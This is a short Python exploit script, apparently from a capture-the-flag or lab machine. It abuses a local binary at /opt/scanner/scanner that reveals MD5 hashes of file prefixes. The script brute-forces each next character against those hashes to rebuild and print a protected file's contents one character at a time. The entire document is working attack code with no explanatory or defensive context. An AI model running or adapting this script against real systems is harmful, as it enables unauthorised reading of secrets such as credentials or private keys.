#!/usr/bin/python3

from hashlib import md5
from shlex import split
from string import printable
from subprocess import run
from sys import argv

target_file = argv[1]
init_pos = 0
content = ''

def get_hash(filename):
    cmd = f'/opt/scanner/scanner -c {filename} -l {init_pos} -p -s 1'
    output = run(split(cmd), capture_output=True)
    _hash = output.stdout.decode().strip().split()[-1]
    
    return _hash

while True:
    try:
        init_pos += 1

        orig_hash = get_hash(target_file)

        for char in printable:
            md5_data = md5((content + char).encode())

            if md5_data.hexdigest() == orig_hash:
                content += char
                print(char, end='')
    
    except IndexError:
        exit(0)